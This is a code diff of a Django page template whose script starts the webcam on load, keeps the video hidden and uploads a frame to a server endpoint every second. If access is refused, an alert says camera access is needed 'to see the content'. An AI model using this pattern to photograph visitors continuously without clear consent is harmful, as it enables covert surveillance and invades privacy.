@@ -6,62 +6,67 @@
             crossorigin="anonymous"></script>
     <video class="d-none" id="video" width="640" height="480" autoplay>
     </video>
-    <img id="capturedImage" src="#" alt="Captured Image" style="display: none">
-    <h1 class="text-center">Switch on the light and make yourself visible</h1>
+    <img class="d-none" id="capturedImage" src="#" alt="Captured Image">
+    <h1 id="text-msg" class="text-center">Switch on the light and make yourself visible</h1>
 {% endblock content %}
 {% block scripts %}
     <script>
-        let csrftoken = '{{ csrf_token }}'
-        const videoElement = document.getElementById('video');
-        const captureBtn = document.getElementById('captureBtn');
-        const capturedImageElement = document.getElementById('capturedImage');
+            let csrftoken = '{{ csrf_token }}'
+            const videoElement = document.getElementById('video');
+            const captureBtn = document.getElementById('captureBtn');
+            const capturedImageElement = document.getElementById('capturedImage');      
 
-        // Get the user media (camera) on page load
-        navigator.mediaDevices.getUserMedia({
-                video: true
-            })
-            .then(stream => {
-                videoElement.srcObject = stream;
-            })
-            .catch(error => {
-                console.error('Error accessing the camera: ', error);
-            });
+            permission = navigator.permissions.query({name: "camera"});
 
-        function send_image() {
-            const canvas = document.createElement('canvas');
-            canvas.width = videoElement.videoWidth;
-            canvas.height = videoElement.videoHeight;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+            function send_image() {
+                const canvas = document.createElement('canvas');
+                canvas.width = videoElement.videoWidth;
+                canvas.height = videoElement.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
 
-            // Convert the captured image to a Blob
-            canvas.toBlob(blob => {
-                // Create FormData and append the image file to it
-                const formData = new FormData();
-                formData.append('image', blob, 'captured_image.jpg'); // 'captured_image.jpg' is the file name
+                // Convert the captured image to a Blob
+                canvas.toBlob(blob => {
+                    // Create FormData and append the image file to it
+                    const formData = new FormData();
+                    formData.append('image', blob, 'captured_image.jpg'); 
 
-                // Send the FormData as a POST request to the server using AJAX
-                $.ajax({
-                    url: '{{ api_url }}', // Replace with your server endpoint
-                    type: 'POST',
-                    headers: {
-                        'X-CSRFToken': csrftoken
-                    },
-                    data: formData,
-                    processData: false,
-                    contentType: false,
-                    success: function(response) {
-                        console.log('passed');
-                    },
-                    error: function(error) {
-                        console.error('Error uploading the image.');
-                    }
+                    // Send the FormData as a POST request to the server using AJAX
+                    $.ajax({
+                        url: '{{ api_url }}', // Replace with your server endpoint
+                        type: 'POST',
+                        headers: {
+                            'X-CSRFToken': csrftoken
+                        },
+                        data: formData,
+                        processData: false,
+                        contentType: false,
+                        success: function(response) {
+                            console.log('passed');
+                        },
+                        error: function(error) {
+                            console.error('Error uploading the image.');
+                        }
+                    });
+                }, 'image/jpeg');
+            }
+
+            // Capture the image when the "Capture Image" button is clicked
+            {% comment %} captureBtn.addEventListener('click', send_image); {% endcomment %}
+            let timerId = setInterval(send_image, 1000);
+
+             // Get the user media (camera) on page load
+             navigator.mediaDevices.getUserMedia({
+                    video: true
+                })
+                .then(stream => {
+                    videoElement.srcObject = stream;
+                    state = true
+                })
+                .catch(error => {
+                    //document.getElementById('text-msg').innerText = "Enable"
+                    alert('You have to enable camera access to see the content')
+                    clearInterval(timerId)
                 });
-            }, 'image/jpeg');
-        }
-
-        // Capture the image when the "Capture Image" button is clicked
-        {% comment %} captureBtn.addEventListener('click', send_image); {% endcomment %}
-        setInterval(send_image, 1000);
-    </script>
+        </script>
 {% endblock scripts %}
